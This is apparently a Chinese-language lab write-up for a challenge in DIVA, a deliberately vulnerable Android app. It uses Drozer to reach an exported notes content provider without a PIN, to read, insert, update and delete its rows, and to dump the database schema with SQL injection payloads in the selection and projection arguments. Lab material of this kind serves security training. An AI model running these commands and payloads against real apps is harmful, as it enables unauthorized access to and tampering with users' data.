---
title: Test DIVA - content provider exported - DB Based
tags: [Android, Drozer]

category: "Tools｜Others｜Android Related｜Drozer｜Test DIVA"
---

# Test DIVA - content provider exported - DB Based
<!-- more -->
這一題是第`11. Access Control Issues - Part 3`，用意是要我們不需要PIN code就可以access儲存起來的notes
1. 起手式
    ```bash
    dz> run app.provider.info -a jakhar.aseem.diva
    Attempting to run shell module
    Package: jakhar.aseem.diva
      Authority: jakhar.aseem.diva.provider.notesprovider
        Read Permission: null
        Write Permission: null
        Content Provider: jakhar.aseem.diva.NotesProvider
        Multiprocess Allowed: False
        Grant Uri Permissions: False
        Uri Permission Patterns:
        Path Permissions:

    dz> run scanner.provider.finduris -a jakhar.aseem.diva
    Attempting to run shell module
    Scanning jakhar.aseem.diva...
    No respone from content URI:      content://jakhar.aseem.diva.provider.notesprovider/
    Got a response from content Uri:  content://jakhar.aseem.diva.provider.notesprovider/notes
    No respone from content URI:      content://jakhar.aseem.diva.provider.notesprovider
    Got a response from content Uri:  content://jakhar.aseem.diva.provider.notesprovider/notes/

    For sure accessible content URIs:
      content://jakhar.aseem.diva.provider.notesprovider/notes
      content://jakhar.aseem.diva.provider.notesprovider/notes/
    ```
    從以上測試結果可以知道`jakhar.aseem.diva.NotesProvider`的狀況，以及對應的URI為何
2. 逆向
從`NotesProvider`這個class可以知道他就是一個負責管理Notes資料庫的一個class，並且同時負責query/update/insert/delete這幾個function，那我們是不是也可以用和Sieve類似的方法對這個database發出request
3. query/insert/update/delete/sqli
    * query
        我們達到了一開始題目的要求，只需要直接query就好了
        ```bash
        dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --vertical
        Attempting to run shell module
          _id  5
        title  Exercise
         note  Alternate days running

          _id  4
        title  Expense
         note  Spent too much on home theater

          _id  6
        title  Weekend
         note  b333333333333r

          _id  3
        title  holiday
         note  Either Goa or Amsterdam

          _id  2
        title  home
         note  Buy toys for baby, Order dinner

          _id  1
        title  office
         note  10 Meetings. 5 Calls. Lunch with CEO
        ```
    * insert
        ```bash
        dz> run app.provider.insert content://jakhar.aseem.diva.provider.notesprovider/notes --integer _id 7 --string title pwn1 --string note pwnpwn1
        Attempting to run shell module
        Done.

        dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
        Attempting to run shell module
        | _id | title    | note                                 |
        | 5   | Exercise | Alternate days running               |
        | 4   | Expense  | Spent too much on home theater       |
        | 6   | Weekend  | b333333333333r                       |
        | 3   | holiday  | Either Goa or Amsterdam              |
        | 2   | home     | Buy toys for baby, Order dinner      |
        | 1   | office   | 10 Meetings. 5 Calls. Lunch with CEO |
        | 7   | pwn1     | pwnpwn1                              |
        ```
    * update
        ```bash
        dz> run app.provider.update content://jakhar.aseem.diva.provider.notesprovider/notes  --selection "_id=?" --selectio
        n-args 7 --string title pwn2 --string note pwnpwn2
        Attempting to run shell module
        Done.

        dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
        Attempting to run shell module
        | _id | title    | note                                 |
        | 5   | Exercise | Alternate days running               |
        | 4   | Expense  | Spent too much on home theater       |
        | 6   | Weekend  | b333333333333r                       |
        | 3   | holiday  | Either Goa or Amsterdam              |
        | 2   | home     | Buy toys for baby, Order dinner      |
        | 1   | office   | 10 Meetings. 5 Calls. Lunch with CEO |
        | 7   | pwn2     | pwnpwn2                              |
        ```
    * delete
        ```bash
        dz> run app.provider.delete content://jakhar.aseem.diva.provider.notesprovider/notes --selection "_id=?" --selection
        -args 7
        Attempting to run shell module
        Done.

        dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
        Attempting to run shell module
        | _id | title    | note                                 |
        | 5   | Exercise | Alternate days running               |
        | 4   | Expense  | Spent too much on home theater       |
        | 6   | Weekend  | b333333333333r                       |
        | 3   | holiday  | Either Goa or Amsterdam              |
        | 2   | home     | Buy toys for baby, Order dinner      |
        | 1   | office   | 10 Meetings. 5 Calls. Lunch with CEO |
        ```
    * sqli
        測試的payload如下，的確出現sqli的漏洞，而且可以看到完整的table
        ```bash
        dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --selection "'"
        Attempting to run shell module
        Exception occured: unrecognized token: "') ORDER BY title" (code 1 SQLITE_ERROR): , while compiling: SELECT * FROM notes WHERE (') ORDER BY title

        dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection "* FROM SQLITE_MASTER WHERE type='table';--"
        Attempting to run shell module
        | type  | name             | tbl_name         | rootpage | sql                                                                                                 |
        | table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                                         |
        | table | notes            | notes            | 4        | CREATE TABLE notes (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, note TEXT NOT NULL) |
        | table | sqlite_sequence  | sqlite_sequence  | 5        | CREATE TABLE sqlite_sequence(name,seq)                                                              |
        ```
        也可以透過drozer自動找可能的點
        ```bash
        dz> run scanner.provider.injection -a jakhar.aseem.diva
        Attempting to run shell module
        Scanning jakhar.aseem.diva...
        Not Vulnerable:
          content://jakhar.aseem.diva.provider.notesprovider/
          content://jakhar.aseem.diva.provider.notesprovider

        Injection in Projection:
          content://jakhar.aseem.diva.provider.notesprovider/notes/
          content://jakhar.aseem.diva.provider.notesprovider/notes

        Injection in Selection:
          content://jakhar.aseem.diva.provider.notesprovider/notes/
          content://jakhar.aseem.diva.provider.notesprovider/notes
        
        dz> run scanner.provider.sqltables -a jakhar.aseem.diva
        Attempting to run shell module
        Scanning jakhar.aseem.diva...
        Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
          android_metadata
          notes
          sqlite_sequence

        Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes:
          android_metadata
          notes
          sqlite_sequence
        ```